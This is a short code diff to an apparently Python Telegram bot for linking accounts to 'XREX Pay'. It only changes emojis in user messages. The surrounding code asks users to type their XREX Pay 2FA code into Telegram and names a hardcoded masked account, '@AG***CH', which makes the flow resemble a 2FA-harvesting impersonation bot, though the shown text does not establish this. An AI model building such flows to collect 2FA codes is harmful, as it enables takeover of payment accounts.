@@ -277,8 +277,8 @@ async def poll_remote_and_sync(session_id: str = None):
                                         if bot_for_notifications:
                                             await bot_for_notifications.send_message(
                                                 chat_id=chat_id,
-                                                text=("✅️ Telegram Bot successfully linked to XREX Pay account @AG***CH\n\n"
-                                                     "Tap the ‘How to use’ button to see how the XREX Pay Bot simplifies payments and more."),
+                                                text=("🎉 Telegram Bot successfully linked to XREX Pay account @AG***CH\n\n"
+                                                     "➡️ Tap the ‘How to use’ button to see how the XREX Pay Bot simplifies payments and more."),
                                                 reply_markup=reply_markup
                                             )
                                             st['stage6_notified'] = True
@@ -441,8 +441,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 sent = await update.message.reply_text(
-                    "✅️ Valid unique verification link detected from XREX Pay account \"@AG***CH\"\n\n"
-                    "Please enter your XREX Pay 2FA to proceed with linking your Telegram account to XREX Pay.",
+                    "️🔍 Valid unique verification link detected from XREX Pay account \"@AG***CH\"\n\n"
+                    "️➡️ Please enter your XREX Pay 2FA to proceed with linking your Telegram account to XREX Pay.",
                     reply_markup=reply_markup
                 )
                 # No pinning per updated spec
@@ -1050,7 +1050,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pinned_id = state.get('pinned_instruction_message_id')
                 # No unpinning per updated spec
 
-                await update.message.reply_text("✅️ 2FA verified! \n\nGenerating linking code... ")
+                await update.message.reply_text("🔐 2FA verified! \n\nGenerating linking code... ")
                 await asyncio.sleep(1)
 
                 # Generate a dynamic linking code per session/user
@@ -1080,7 +1080,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ]]
                 reply_markup = InlineKeyboardMarkup(keyboard)
                 final_msg = await update.message.reply_text(
-                    "Please copy the linking code, go to XREX Pay, and enter it there. (Valid for 5 minutes)",
+                    "➡️ Please copy the linking code, go to XREX Pay, and enter it there. (Valid for 5 minutes)",
                     reply_markup=reply_markup
                 )
                 # No pinning per updated spec
